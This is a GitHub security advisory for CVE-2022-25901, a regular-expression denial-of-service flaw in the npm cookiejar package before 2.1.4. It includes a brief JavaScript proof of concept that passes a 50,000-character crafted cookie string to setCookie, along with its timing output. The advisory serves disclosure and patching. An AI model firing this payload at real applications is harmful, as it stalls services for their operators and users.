# [M] cookiejar Regular Expression Denial of Service via Cookie.parse function

## Summary
Severity: Medium
Advisory: GHSA-h452-7996-h45h
CVE: CVE-2022-25901
CWE: CWE-1333
Ecosystem: Maven, npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L (CVSS_V3)
Published: 2023-01-18
Source: https://github.com/advisories/GHSA-h452-7996-h45h
Type: github-advisory

## Affected
- npm: `cookiejar` — affected >=0 <2.1.4
- Maven: `org.webjars.npm:cookiejar` — affected >=0

## Details
Versions of the package cookiejar before 2.1.4 are vulnerable to Regular Expression Denial of Service (ReDoS) via the `Cookie.parse` function and other aspects of the API, which use an insecure regular expression for parsing cookie values. Applications could be stalled for extended periods of time if untrusted input is passed to cookie values or attempted to parse from request headers.

Proof of concept:

```
ts\nconst { CookieJar } = require("cookiejar");

const jar = new CookieJar();

const start = performance.now();

const attack = "a" + "t".repeat(50_000);
jar.setCookie(attack);

console.log(`CookieJar.setCookie(): ${performance.now() - start}ms`);

```

```
CookieJar.setCookie(): 2963.214399999939ms
```

## References
- https://nvd.nist.gov/vuln/detail/CVE-2022-25901
- https://github.com/bmeck/node-cookiejar/pull/39
- https://github.com/bmeck/node-cookiejar/pull/39/commits/eaa00021caf6ae09449dde826108153b578348e5
- https://github.com/bmeck/node-cookiejar
- https://github.com/bmeck/node-cookiejar/blob/master/cookiejar.js#23L73
- https://github.com/bmeck/node-cookiejar/blob/master/cookiejar.js%23L73
- https://lists.debian.org/debian-lts-announce/2023/09/msg00008.html
- https://security.snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-3176681
- https://security.snyk.io/vuln/SNYK-JS-COOKIEJAR-3149984
